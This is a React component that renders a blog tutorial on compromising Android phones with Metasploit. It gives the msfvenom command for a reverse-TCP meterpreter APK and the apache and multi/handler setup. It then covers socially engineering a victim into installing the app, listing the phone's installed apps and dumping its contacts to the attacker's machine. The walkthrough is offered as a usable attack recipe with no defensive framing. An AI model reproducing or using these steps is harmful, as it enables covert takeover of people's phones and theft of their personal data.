import React from 'react'
import './blog1.css'
import MetaSploit from './images/metasploit.jpeg'
import Ifconfig from './images/blog1/ifconfig.png'
import Apache from './images/blog1/apache.png'
import Applist from './images/blog1/applist.png'
import Downloaded from './images/blog1/downloaded.png'
import Handler from './images/blog1/handler.png'
import Help from './images/blog1/help.png'
import InstallApp from './images/blog1/installApp.png'
import MainActivity from './images/blog1/mainActivity.png'
import Meterpreter from './images/blog1/meterpreter.png'
import Payload from './images/blog1/payload.png'
import Tcphandler from './images/blog1/tcphandler.png'
import Unknownsrc from './images/blog1/unknownsrc.png'
import Cdump from './images/blog1/cdump.png'
import SaveContact from './images/blog1/savecontact.png'


function blog1() {
    window.scrollTo(0, 0);
    return(
      <>
      <div id='border'></div>
        <main class="container">
        <div class="custom-container">
        <h1>Access Android through Metasploit Framework in Arch Linux</h1>
        <img alt="" src={MetaSploit} class="blog-page-cover"/>
        <h6>Last Updated: September 29, 2021</h6>
        <p class="blog-content">
            <h4>We will use msfvenom for creating a payload and save it as an apk file. After generating the payload, we need to setup a listener to Metasploit framework. Once the target downloads and installs the malicious apk then, an attacker can easily get back a meterpreter session on Metasploit. An attacker needs to do some social engineering to install apk on the victim’s mobile device.</h4>
            <h3>Step 1</h3>
            <p>At first, open your Arch Linux then We need to check our local IP that like to be ‘192.168.0.112’. Run command ifconfig in terminal</p>
            <img alt="" src={Ifconfig} class="blog-page-cover"/>
            <p>ip address is showing in red outline box. After getting your Local host IP use msfvenom tool that will generate a payload to penetrate the Android device. Type command:</p>
            <p class='command'>msfvenom –p android/meterpreter/reverse_tcp LHOST=192.168.0.112 LPORT=4444 R /var/www/html/ehacking.apk</p>
            <p>Where:</p>
            <p>
                -p indicates a payload type
                android/metepreter/reverse_tcp specifies a reverse meterpreter shell would come in from a target Android device
                LHOST is your local IP
                LPORT is set to be as a listening port
                R /var/www/html would give the output directly on apache server
                apk is the name of output payload
            </p>
            <h4>This would take some time to generate an apk file of almost ten thousand bytes.</h4>
            <img alt="" src={Payload} class="blog-page-cover"/>
            <h3>Launching an Attack</h3>
            <p>Before launching attack, we need to check the status of the apache server. Type command:</p>
            <p class='command'># service apache2 status</p>
            <img alt="" src={Apache} class="blog-page-cover"/>
            <p>All seems set, now fire up msfconsole. Use multi/handler exploit, set payload the same as generated prevoisly, set LHOST and LPORT values same as used in payload and finally type exploit to launch an attack.
            <img alt="" src={Handler} class="blog-page-cover"/>
            <p>In real life scenarios, some social engineering techniques can be used to let the target download the malicious apk file. For demonstration we are just accessing the attacker machine to download the file in the Android device.</p>
            <img alt="" src={InstallApp} class="blog-page-cover"/>
            <p>After downloading it successfully, select the app to install.</p>
            <img alt="" src={Downloaded} class="blog-page-cover"/>
            <p>So far, this option has been seen frequently when we try to install some third-party apps and normally users wont hesitate to allow the installation from unknown sources.</p>
            <img alt="" src={Unknownsrc} class="blog-page-cover"/>
            <p>Enable the settings to install applications from the third-party sources. And finally hit the install option at the bottom.</p>
            <img alt="" src={MainActivity} class="blog-page-cover"/>
            <p>Once the user installs the application and runs it, the meterepreter session would be opened immediatly at the attacking side.</p>
            <img alt="" src={Meterpreter} class="blog-page-cover"/>
            <h4>Post Exploitation</h4>
            <p>Type “background” and then “sessions” to list down all the sessions from where you can see all the IPs connected to the machine.</p>
            <img alt="" src={Tcphandler} class="blog-page-cover"/>
            <p>DONE!! You can interact with any session by typing sessions -i [session ID]

After entering the session, type “help” to list down all the commands we can put forward in this session.

You can see some file system commands that are helpful when you’re trying to go after some sensitive information or data. By using these, You can easily download or upload any file or information.</p> 
<img alt="" src={Help} class="blog-page-cover"/>    
            <p>Type “app_list” and it will show you all the installed apps on the device</p>
            <img alt="" src={Applist} class="blog-page-cover"/> 
            <h4>Extracting Contacts from an Android Device</h4>
            <p>Now let extract some contacts from the target device by typing “dump” and double tab</p>
            <img alt="" src={Cdump} class="blog-page-cover"/>
            <p>It will show all the options to extract from the device. Type “dump_contacts” and enter</p>
            <img alt="" src={SaveContact} class="blog-page-cover"/>
            <p>It extract all contacts from androiddevice to your local directory in txt file</p>
            <h4>There are lots of more commands available in meterpreter. Further try to explore and learn what we can perform with an Android device.</h4>
            
            
</p>
        </p>
    </div>
</main>

<div class="clear-div"></div>

<footer class="footer">
    <p class="footer-content"></p>
</footer>

<script src="../js/app.js"></script>
      </>
    )
}
export default blog1;